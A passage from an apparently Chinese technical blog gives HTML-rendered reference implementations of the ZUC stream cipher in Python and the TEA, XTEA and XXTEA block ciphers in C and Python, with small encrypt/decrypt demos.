class="number">0x05</span>, <span class="number">0x22</span>, <span class="number">0x66</span>, <span class="number">0xBF</span>, <span class="number">0xDC</span>, <span class="number">0x0B</span>, <span class="number">0xFA</span>, <span class="number">0x62</span>, <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0xDD</span>, <span class="number">0x20</span>, <span class="number">0x11</span>, <span class="number">0x06</span>, <span class="number">0x36</span>, <span class="number">0xC9</span>, <span class="number">0xC1</span>, <span class="number">0xCF</span>, <span class="number">0xF6</span>, <span class="number">0x27</span>, <span class="number">0x52</span>, <span class="number">0xBB</span>, <span class="number">0x69</span>, <span class="number">0xF5</span>, <span class="number">0xD4</span>, <span class="number">0x87</span>,</span><br><span class="line">    <span class="number">0x7F</span>, <span class="number">0x84</span>, <span class="number">0x4C</span>, <span class="number">0xD2</span>, <span class="number">0x9C</span>, <span class="number">0x57</span>, <span class="number">0xA4</span>, <span class="number">0xBC</span>, <span class="number">0x4F</span>, <span class="number">0x9A</span>, <span class="number">0xDF</span>, <span class="number">0xFE</span>, <span class="number">0xD6</span>, <span class="number">0x8D</span>, <span class="number">0x7A</span>, <span class="number">0xEB</span>,</span><br><span class="line">    <span class="number">0x2B</span>, <span class="number">0x53</span>, <span class="number">0xD8</span>, <span class="number">0x5C</span>, <span class="number">0xA1</span>, <span class="number">0x14</span>, <span class="number">0x17</span>, <span class="number">0xFB</span>, <span class="number">0x23</span>, <span class="number">0xD5</span>, <span class="number">0x7D</span>, <span class="number">0x30</span>, <span class="number">0x67</span>, <span class="number">0x73</span>, <span class="number">0x08</span>, <span class="number">0x09</span>,</span><br><span class="line">    <span class="number">0xEE</span>, <span class="number">0xB7</span>, <span class="number">0x70</span>, <span class="number">0x3F</span>, <span class="number">0x61</span>, <span class="number">0xB2</span>, <span class="number">0x19</span>, <span class="number">0x8E</span>, <span class="number">0x4E</span>, <span class="number">0xE5</span>, <span class="number">0x4B</span>, <span class="number">0x93</span>, <span class="number">0x8F</span>, <span class="number">0x5D</span>, <span class="number">0xDB</span>, <span class="number">0xA9</span>,</span><br><span class="line">    <span class="number">0xAD</span>, <span class="number">0xF1</span>, <span class="number">0xAE</span>, <span class="number">0x2E</span>, <span class="number">0xCB</span>, <span class="number">0x0D</span>, <span class="number">0xFC</span>, <span class="number">0xF4</span>, <span class="number">0x2D</span>, <span class="number">0x46</span>, <span class="number">0x6E</span>, <span class="number">0x1D</span>, <span class="number">0x97</span>, <span class="number">0xE8</span>, <span class="number">0xD1</span>, <span class="number">0xE9</span>,</span><br><span class="line">    <span class="number">0x4D</span>, <span class="number">0x37</span>, <span class="number">0xA5</span>, <span class="number">0x75</span>, <span class="number">0x5E</span>, <span class="number">0x83</span>, <span class="number">0x9E</span>, <span class="number">0xAB</span>, <span class="number">0x82</span>, <span class="number">0x9D</span>, <span class="number">0xB9</span>, <span class="number">0x1C</span>, <span class="number">0xE0</span>, <span class="number">0xCD</span>, <span class="number">0x49</span>, <span class="number">0x89</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0xB6</span>, <span class="number">0xBD</span>, <span class="number">0x58</span>, <span class="number">0x24</span>, <span class="number">0xA2</span>, <span class="number">0x5F</span>, <span class="number">0x38</span>, <span class="number">0x78</span>, <span class="number">0x99</span>, <span class="number">0x15</span>, <span class="number">0x90</span>, <span class="number">0x50</span>, <span class="number">0xB8</span>, <span class="number">0x95</span>, <span class="number">0xE4</span>,</span><br><span class="line">    <span class="number">0xD0</span>, <span class="number">0x91</span>, <span class="number">0xC7</span>, <span class="number">0xCE</span>, <span class="number">0xED</span>, <span class="number">0x0F</span>, <span class="number">0xB4</span>, <span class="number">0x6F</span>, <span class="number">0xA0</span>, <span class="number">0xCC</span>, <span class="number">0xF0</span>, <span class="number">0x02</span>, <span class="number">0x4A</span>, <span class="number">0x79</span>, <span class="number">0xC3</span>, <span class="number">0xDE</span>,</span><br><span class="line">    <span class="number">0xA3</span>, <span class="number">0xEF</span>, <span class="number">0xEA</span>, <span class="number">0x51</span>, <span class="number">0xE6</span>, <span class="number">0x6B</span>, <span class="number">0x18</span>, <span class="number">0xEC</span>, <span class="number">0x1B</span>, <span class="number">0x2C</span>, <span class="number">0x80</span>, <span class="number">0xF7</span>, <span class="number">0x74</span>, <span class="number">0xE7</span>, <span class="number">0xFF</span>, <span class="number">0x21</span>,</span><br><span class="line">    <span class="number">0x5A</span>, <span class="number">0x6A</span>, <span class="number">0x54</span>, <span class="number">0x1E</span>, <span class="number">0x41</span>, <span class="number">0x31</span>, <span class="number">0x92</span>, <span class="number">0x35</span>, <span class="number">0xC4</span>, <span class="number">0x33</span>, <span class="number">0x07</span>, <span class="number">0x0A</span>, <span class="number">0xBA</span>, <span class="number">0x7E</span>, <span class="number">0x0E</span>, <span class="number">0x34</span>,</span><br><span class="line">    <span class="number">0x88</span>, <span class="number">0xB1</span>, <span class="number">0x98</span>, <span class="number">0x7C</span>, <span class="number">0xF3</span>, <span class="number">0x3D</span>, <span class="number">0x60</span>, <span class="number">0x6C</span>, <span class="number">0x7B</span>, <span class="number">0xCA</span>, <span class="number">0xD3</span>, <span class="number">0x1F</span>, <span class="number">0x32</span>, <span class="number">0x65</span>, <span class="number">0x04</span>, <span class="number">0x28</span>,</span><br><span class="line">    <span class="number">0x64</span>, <span class="number">0xBE</span>, <span class="number">0x85</span>, <span class="number">0x9B</span>, <span class="number">0x2F</span>, <span class="number">0x59</span>, <span class="number">0x8A</span>, <span class="number">0xD7</span>, <span class="number">0xB0</span>, <span class="number">0x25</span>, <span class="number">0xAC</span>, <span class="number">0xAF</span>, <span class="number">0x12</span>, <span class="number">0x03</span>, <span class="number">0xE2</span>, <span class="number">0xF2</span></span><br><span class="line">]</span><br><span class="line"> </span><br><span class="line">D = [</span><br><span class="line">    <span class="number">0x44D7</span>, <span class="number">0x26BC</span>, <span class="number">0x626B</span>, <span class="number">0x135E</span>, <span class="number">0x5789</span>, <span class="number">0x35E2</span>, <span class="number">0x7135</span>, <span class="number">0x09AF</span>,</span><br><span class="line">    <span class="number">0x4D78</span>, <span class="number">0x2F13</span>, <span class="number">0x6BC4</span>, <span class="number">0x1AF1</span>, <span class="number">0x5E26</span>, <span class="number">0x3C4D</span>, <span class="number">0x789A</span>, <span class="number">0x47AC</span></span><br><span class="line">]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addition_uint31</span>(<span class="params">a, b</span>):</span><br><span class="line">    c = a + b</span><br><span class="line">    <span class="keyword">return</span> (c &amp; <span class="number">0x7FFFFFFF</span>) + (c &gt;&gt; <span class="number">31</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rotl_uint31</span>(<span class="params">a, shift</span>):</span><br><span class="line">    <span class="keyword">return</span> ((a &lt;&lt; shift) | (a &gt;&gt; (<span class="number">31</span> - shift))) &amp; <span class="number">0x7FFFFFFF</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rotl_uint32</span>(<span class="params">a, shift</span>):</span><br><span class="line">    <span class="keyword">return</span> ((a &lt;&lt; shift) | (a &gt;&gt; (<span class="number">32</span> - shift))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">l1</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> (x ^ rotl_uint32(x, <span class="number">2</span>) ^ rotl_uint32(x, <span class="number">10</span>) ^ rotl_uint32(x, <span class="number">18</span>) ^ rotl_uint32(x, <span class="number">24</span>))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">l2</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> (x ^ rotl_uint32(x, <span class="number">8</span>) ^ rotl_uint32(x, <span class="number">14</span>) ^ rotl_uint32(x, <span class="number">22</span>) ^ rotl_uint32(x, <span class="number">30</span>))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_uint32</span>(<span class="params">a, b, c, d</span>):</span><br><span class="line">    <span class="keyword">return</span> ((a &lt;&lt; <span class="number">24</span>) &amp; <span class="number">0xffffffff</span>) | ((b &lt;&lt; <span class="number">16</span>) &amp; <span class="number">0xffffffff</span>) | ((c &lt;&lt; <span class="number">8</span>) &amp; <span class="number">0xffffffff</span>) | d</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_uint31</span>(<span class="params">a, b, c</span>):</span><br><span class="line">    <span class="keyword">return</span> ((a &lt;&lt; <span class="number">23</span>) &amp; <span class="number">0x7fffffff</span>) | ((b &lt;&lt; <span class="number">8</span>) &amp; <span class="number">0x7fffffff</span>) | c</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ZUC</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, key, iv</span>):</span><br><span class="line">        self.r = [<span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">        self.lfsr = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">        self.x = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">        self.zuc_init(key, iv)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bit_reorganization</span>(<span class="params">self</span>):</span><br><span class="line">        self.x[<span class="number">0</span>] = ((self.lfsr[<span class="number">15</span>] &amp; <span class="number">0x7FFF8000</span>) &lt;&lt; <span class="number">1</span>) | (self.lfsr[<span class="number">14</span>] &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">        self.x[<span class="number">1</span>] = ((self.lfsr[<span class="number">11</span>] &amp; <span class="number">0xFFFF</span>) &lt;&lt; <span class="number">16</span>) | (self.lfsr[<span class="number">9</span>] &gt;&gt; <span class="number">15</span>)</span><br><span class="line">        self.x[<span class="number">2</span>] = ((self.lfsr[<span class="number">7</span>] &amp; <span class="number">0xFFFF</span>) &lt;&lt; <span class="number">16</span>) | (self.lfsr[<span class="number">5</span>] &gt;&gt; <span class="number">15</span>)</span><br><span class="line">        self.x[<span class="number">3</span>] = ((self.lfsr[<span class="number">2</span>] &amp; <span class="number">0xFFFF</span>) &lt;&lt; <span class="number">16</span>) | (self.lfsr[<span class="number">0</span>] &gt;&gt; <span class="number">15</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lfsr_next</span>(<span class="params">self</span>):</span><br><span class="line">        f = self.lfsr[<span class="number">0</span>]</span><br><span class="line">        v = rotl_uint31(self.lfsr[<span class="number">0</span>], <span class="number">8</span>)</span><br><span class="line">        f = addition_uint31(f, v)</span><br><span class="line">        v = rotl_uint31(self.lfsr[<span class="number">4</span>], <span class="number">20</span>)</span><br><span class="line">        f = addition_uint31(f, v)</span><br><span class="line">        v = rotl_uint31(self.lfsr[<span class="number">10</span>], <span class="number">21</span>)</span><br><span class="line">        f = addition_uint31(f, v)</span><br><span class="line">        v = rotl_uint31(self.lfsr[<span class="number">13</span>], <span class="number">17</span>)</span><br><span class="line">        f = addition_uint31(f, v)</span><br><span class="line">        v = rotl_uint31(self.lfsr[<span class="number">15</span>], <span class="number">15</span>)</span><br><span class="line">        f = addition_uint31(f, v)</span><br><span class="line">        <span class="keyword">return</span> f</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lfsr_append</span>(<span class="params">self, f</span>):</span><br><span class="line">        self.lfsr.append(f)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(self.lfsr) &gt; <span class="number">16</span>:</span><br><span class="line">            self.lfsr.pop(<span class="number">0</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lfsr_init</span>(<span class="params">self, u</span>):</span><br><span class="line">        self.lfsr_append(addition_uint31(self.lfsr_next(), u))</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lfsr_shift</span>(<span class="params">self</span>):</span><br><span class="line">        self.lfsr_append(self.lfsr_next())</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">self</span>):</span><br><span class="line">        W = ((self.x[<span class="number">0</span>] ^ self.r[<span class="number">0</span>]) + self.r[<span class="number">1</span>]) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        W1 = (self.r[<span class="number">0</span>] + self.x[<span class="number">1</span>]) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        W2 = self.r[<span class="number">1</span>] ^ self.x[<span class="number">2</span>]</span><br><span class="line">        u = l1(((W1 &amp; <span class="number">0x0000ffff</span>) &lt;&lt; <span class="number">16</span>) | (W2 &gt;&gt; <span class="number">16</span>))</span><br><span class="line">        v = l2(((W2 &amp; <span class="number">0x0000ffff</span>) &lt;&lt; <span class="number">16</span>) | (W1 &gt;&gt; <span class="number">16</span>))</span><br><span class="line">        self.r = [make_uint32(S0[u &gt;&gt; <span class="number">24</span>], S1[(u &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>],</span><br><span class="line">                              S0[(u &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>], S1[u &amp; <span class="number">0xFF</span>]),</span><br><span class="line">                  make_uint32(S0[v &gt;&gt; <span class="number">24</span>], S1[(v &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>],</span><br><span class="line">                              S0[(v &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>], S1[v &amp; <span class="number">0xFF</span>])]</span><br><span class="line">        <span class="keyword">return</span> W</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">zuc_init</span>(<span class="params">self, key, iv</span>):</span><br><span class="line">        <span class="comment"># Expand key.</span></span><br><span class="line">        self.lfsr = [make_uint31(key[i], D[i], iv[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">        self.r = [<span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            self.bit_reorganization()</span><br><span class="line">            w = self.f()</span><br><span class="line">            self.lfsr_init(w &gt;&gt; <span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">zuc_generate_keystream</span>(<span class="params">self, length</span>):</span><br><span class="line">        keystream_buffer = []</span><br><span class="line">        self.bit_reorganization()</span><br><span class="line">        self.f()  <span class="comment"># Discard the output of F.</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">itor</span>():</span><br><span class="line">            self.lfsr_shift()</span><br><span class="line">            self.bit_reorganization()</span><br><span class="line">            <span class="keyword">return</span> self.f() ^ self.x[-<span class="number">1</span>]</span><br><span class="line"> </span><br><span class="line">        keystream_buffer = [itor() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length)]</span><br><span class="line">        self.lfsr_shift()</span><br><span class="line">        <span class="keyword">return</span> keystream_buffer</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">zuc_encrypt</span>(<span class="params">self, <span class="built_in">input</span></span>):</span><br><span class="line">        length = <span class="built_in">len</span>(<span class="built_in">input</span>)</span><br><span class="line">        key_stream = self.zuc_generate_keystream(length)</span><br><span class="line">        <span class="keyword">return</span> [inp ^ key_stream[i] <span class="keyword">for</span> i, inp <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">input</span>)]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;__main__&#x27;</span> == __name__:</span><br><span class="line">    key = [<span class="number">0x00</span>] * <span class="number">16</span></span><br><span class="line">    iv = [<span class="number">0x00</span>] * <span class="number">16</span></span><br><span class="line">    zuc = ZUC(key, iv)</span><br><span class="line">    <span class="comment"># 加密过程</span></span><br><span class="line">    out = zuc.zuc_encrypt(<span class="string">b&quot;i love u&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;加密得到的字流&quot;</span>, [<span class="string">&quot;%08x&quot;</span> % e <span class="keyword">for</span> e <span class="keyword">in</span> out])</span><br><span class="line">    <span class="comment"># 解密过程</span></span><br><span class="line">    zuc2 = ZUC(key, iv)</span><br><span class="line">    out2 = zuc2.zuc_encrypt(out)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密得到的字流&quot;</span>, [<span class="string">&quot;%08x&quot;</span> % e <span class="keyword">for</span> e <span class="keyword">in</span> out2])</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>(out2))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="分组"><a class="markdownIt-Anchor" href="#分组">#</a> 分组</h2>
<h3 id="tea"><a class="markdownIt-Anchor" href="#tea">#</a> TEA</h3>
<h4 id="tea-2"><a class="markdownIt-Anchor" href="#tea-2">#</a> TEA</h4>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> uint unsigned int</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">encrypt</span><span class="params">(uint *v, uint *key)</span></span><br><span class="line">&#123;</span><br><span class="line">  uint l = v[<span class="number">0</span>], r = v[<span class="number">1</span>], sum = <span class="number">0</span>, delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">32</span>; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    sum += delta;</span><br><span class="line">    l += ((r &lt;&lt; <span class="number">4</span>) + key[<span class="number">0</span>]) ^ (r + sum) ^ ((r &gt;&gt; <span class="number">5</span>) + key[<span class="number">1</span>]);</span><br><span class="line">    r += ((l &lt;&lt; <span class="number">4</span>) + key[<span class="number">2</span>]) ^ (l + sum) ^ ((l &gt;&gt; <span class="number">5</span>) + key[<span class="number">3</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  v[<span class="number">0</span>] = l, v[<span class="number">1</span>] = r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">(uint *v, uint *key)</span></span><br><span class="line">&#123;</span><br><span class="line">  uint l = v[<span class="number">0</span>], r = v[<span class="number">1</span>], sum = <span class="number">0</span>, delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">  sum = delta * <span class="number">32</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">32</span>; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    r -= ((l &lt;&lt; <span class="number">4</span>) + key[<span class="number">2</span>]) ^ (l + sum) ^ ((l &gt;&gt; <span class="number">5</span>) + key[<span class="number">3</span>]);</span><br><span class="line">    l -= ((r &lt;&lt; <span class="number">4</span>) + key[<span class="number">0</span>]) ^ (r + sum) ^ ((r &gt;&gt; <span class="number">5</span>) + key[<span class="number">1</span>]);</span><br><span class="line">    sum -= delta;</span><br><span class="line">  &#125;</span><br><span class="line">  v[<span class="number">0</span>] = l, v[<span class="number">1</span>] = r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="xtea"><a class="markdownIt-Anchor" href="#xtea">#</a> XTEA</h4>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> uint unsigned int</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">encrypt</span><span class="params">(uint *v, uint *key)</span></span><br><span class="line">&#123;</span><br><span class="line">  uint l = v[<span class="number">0</span>], r = v[<span class="number">1</span>], sum = <span class="number">0</span>, delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">32</span>; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    l += (((r &lt;&lt; <span class="number">4</span>) ^ (r &gt;&gt; <span class="number">5</span>)) + r) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    sum += delta;</span><br><span class="line">    r += (((l &lt;&lt; <span class="number">4</span>) ^ (l &gt;&gt; <span class="number">5</span>)) + l) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  v[<span class="number">0</span>] = l;</span><br><span class="line">  v[<span class="number">1</span>] = r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">(uint *v, uint *key)</span></span><br><span class="line">&#123;</span><br><span class="line">  uint l = v[<span class="number">0</span>], r = v[<span class="number">1</span>], sum = <span class="number">0</span>, delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">  sum = delta * <span class="number">32</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">32</span>; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    r -= (((l &lt;&lt; <span class="number">4</span>) ^ (l &gt;&gt; <span class="number">5</span>)) + l) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">    sum -= delta;</span><br><span class="line">    l -= (((r &lt;&lt; <span class="number">4</span>) ^ (r &gt;&gt; <span class="number">5</span>)) + r) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  v[<span class="number">0</span>] = l;</span><br><span class="line">  v[<span class="number">1</span>] = r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="xxtea"><a class="markdownIt-Anchor" href="#xxtea">#</a> XXTEA</h4>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> uint unsigned int</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z &gt;&gt; 5 ^ y <span class="string">&lt;&lt; 2) + (y &gt;</span>&gt; 3 ^ z &lt;&lt; 4)) ^ ((sum ^ y) + (k[(i &amp; 3) ^ e] ^ z)))</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">xxtea</span><span class="params">(uint *v, <span class="type">int</span> n, uint *k)</span>  </span><br><span class="line">&#123;</span><br><span class="line">  uint y, z, sum, i, t, e, delta = <span class="number">0x9e3779b9</span>;;</span><br><span class="line">  <span class="keyword">if</span> (n &gt; <span class="number">1</span>) <span class="comment">// encrypt</span></span><br><span class="line">  &#123;</span><br><span class="line">    t = <span class="number">6</span> + <span class="number">52</span> / n, sum = <span class="number">0</span>, z = v[n - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">while</span> (t--)</span><br><span class="line">    &#123;</span><br><span class="line">      sum += delta, e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">      <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; ++i)</span><br><span class="line">      &#123;</span><br><span class="line">        y = v[i + <span class="number">1</span>];</span><br><span class="line">        z = v[i] += MX;</span><br><span class="line">      &#125;</span><br><span class="line">      y = v[<span class="number">0</span>];</span><br><span class="line">      z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>) <span class="comment">// decrypt</span></span><br><span class="line">  &#123;</span><br><span class="line">    n = -n, t = <span class="number">6</span> + <span class="number">52</span> / n, sum = t * delta, y = v[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">while</span> (t--)</span><br><span class="line">    &#123;</span><br><span class="line">      e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">      <span class="keyword">for</span> (i = n - <span class="number">1</span>; i &gt; <span class="number">0</span>; --i)</span><br><span class="line">      &#123;</span><br><span class="line">        z = v[i - <span class="number">1</span>];</span><br><span class="line">        y = v[i] -= MX;</span><br><span class="line">      &#125;</span><br><span class="line">      z = v[n - <span class="number">1</span>];</span><br><span class="line">      y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">      sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  uint v[<span class="number">2</span>]= &#123;<span class="number">1</span>,<span class="number">2</span>&#125;, k[<span class="number">4</span>]= &#123;<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">  <span class="type">int</span> n = <span class="number">2</span>; <span class="comment">// abs(n) = strlen(v)</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;data: %u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">  xxtea(v, n, k);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;encrypt:%u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">  xxtea(v, -n, k);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;decrypt: %u %u\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MX</span>(<span class="params">z, y, total, key, p, e</span>):</span><br><span class="line">    temp1 = (z.value &gt;&gt; <span class="number">5</span> ^ y.value &lt;&lt; <span class="number">2</span>) + (y.value &gt;&gt; <span class="number">3</span> ^ z.value &lt;&lt; <span class="number">4</span>)</span><br><span class="line">    temp2 = (total.value ^ y.value) + (key[(p &amp; <span class="number">3</span>) ^ e.value] ^ z.value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> c_uint32(temp1 ^ temp2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">n, v, key</span>):</span><br><span class="line">    delta = <span class="number">0x9e3779b9</span></span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> // n</span><br><span class="line"></span><br><span class="line">    total = c_uint32(<span class="number">0</span>)</span><br><span class="line">    z = c_uint32(v[n - <span class="number">1</span>])</span><br><span class="line">    e = c_uint32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> rounds &gt; <span class="number">0</span>:</span><br><span class="line">        total.value += delta</span><br><span class="line">        e.value = (total.value &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">            y = c_uint32(v[p + <span class="number">1</span>])</span><br><span class="line">            v[p] = c_uint32(v[p] + MX(z, y, total, key, p, e).value).value</span><br><span class="line">            z.value = v[p]</span><br><span class="line">        y = c_uint32(v[<span class="number">0</span>])</span><br><span class="line">        v[n - <span class="number">1</span>] = c_uint32(v[n - <span class="number">1</span>] + MX(z, y, total, key, n - <span class="number">1</span>, e).value).value</span><br><span class="line">        z.value = v[n - <span class="number">1</span>]</span><br><span class="line">        rounds -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">n, v, key</span>):</span><br><span class="line">    delta = <span class="number">0x9e3779b9</span></span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> // n</span><br><span class="line"></span><br><span class="line">    total = c_uint32(rounds * delta)</span><br><span class="line">    y = c_uint32(v[<span class="number">0</span>])</span><br><span class="line">    e = c_uint32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> rounds &gt; <span class="number">0</span>:</span><br><span class="line">        e.value = (total.value &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            z = c_uint32(v[p - <span class="number">1</span>])</span><br><span class="line">            v[p] = c_uint32((v[p] - MX(z, y, total, key, p, e).value)).value</span><br><span class="line">            y.value = v[p]</span><br><span class="line">        z = c_uint32(v[n - <span class="number">1</span>])</span><br><span class="line">        v[<span class="number">0</span>] = c_uint32(v[<span class="number">0</span>] - MX(z, y, total, key, <span class="number">0</span>, e).value).value</span><br><span class="line">        y.value = v[<span class="number">0</span>]</span><br><span class="line">        total.value -= delta</span><br><span class="line">        rounds -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#  test</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 